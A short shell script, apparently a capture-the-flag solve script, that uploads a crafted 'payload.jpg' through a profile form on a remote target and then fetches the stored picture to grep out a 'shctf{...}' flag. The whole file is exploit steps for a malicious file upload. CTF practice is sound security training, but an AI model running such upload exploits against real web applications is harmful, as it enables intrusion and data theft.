#!/bin/sh
# usage: ./solve.sh <remote>

curl -s -F 'name=geebis the third' -F 'bio=hey can you hold this for me real quick' -F 'pic=@payload.jpg;type=image/jpeg' "$1"/profile > /dev/null
curl -s "$1/profiles/geebis%20the%20third/pic.jpg" | grep -ao 'shctf{.*}'
